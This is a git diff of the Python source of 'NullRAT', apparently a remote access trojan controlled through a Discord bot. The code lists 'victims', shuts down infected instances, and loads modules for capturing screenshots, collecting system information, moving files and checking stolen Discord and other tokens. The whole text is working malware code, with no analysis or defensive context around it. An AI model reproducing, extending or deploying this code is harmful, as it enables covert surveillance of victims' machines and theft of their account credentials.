@@ -120,24 +120,24 @@ async def listvictims(ctx):
     await ctx.response.send_message("__Checked all available victims:__")
 
 @client.slash_command()
-async def close(ctx, victim):
+async def shutdown(ctx, victim):
     """Shuts down a specific instance of NullRAT.
     
     Parameters
     ----------
     victim: Identifier of the affected computer (found via /listvictims)
     """
-    if str(victim) == str(identifier):
+    if str(victim) == str(client.identifier):
         await ctx.response.send_message(
             embed = client.genEmbed(
-                "Closing NullRAT for machine " + identifier,
+                "Shutting down NullRAT for **" + client.identifier + "**...",
                 datetime.now()
             )
         )
         await client.close()
         
 @client.slash_command(description="Quits all instances of NullRAT")
-async def close_all(ctx):
+async def shutdown_all(ctx):
     """Shuts down all instances of NullRAT"""
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
     
@@ -149,6 +149,7 @@ class closeall_confirm(discord.ui.View):
         for child in self.children:
             child.disabled = True
         await interaction.response.edit_message(view=self) 
+        await interaction.delete_original_message()
         await interaction.channel.send(embed=Embed(title="Shutting down all instances of NullRAT...")) 
         await client.close()
         
@@ -157,17 +158,20 @@ class closeall_confirm(discord.ui.View):
         for child in self.children:
             child.disabled = True
         await interaction.response.edit_message(view=self) 
-        await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
+        await interaction.delete_original_message()
+        await interaction.channel.send(embed=Embed(title="Aborted shutting down of all instances"))   
         
 ############### Bot Extensions
 
-# extensions = (
-    # "Aa"
-# )
-client.load_extension("modules."+"receivefiles")
+extensions = (
+    "systeminfo",     # /get_systeminfo
+    "screenshot",     # /get_screenshot
+    "receivefiles",   # /receivefiles
+    "checkedtokens"   # /checked_tokens & /checked_discord
+)
 
-# for ex in extensions:
-    # client.load_extension("modules."+"receivefiles")
+for ex in extensions:
+    client.load_extension("modules."+ex)
 
 ############### Bot Startup
 def is_connected():
@@ -188,7 +192,4 @@ client.run(bot_token)
     # "directory",      # /get_currentdir & /change_directory & /list_directory
     # "rawtokens",      # /raw_tokens & /raw_discord
     # "sendfiles",      # /sendfiles
-    # "systeminfo",     # /get_systeminfo
-    # "screenshot",     # /get_screenshot
-    # "receivefiles",   # /receivefiles
-    # "checkedtokens"   # /checked_tokens & /checked_discord
+
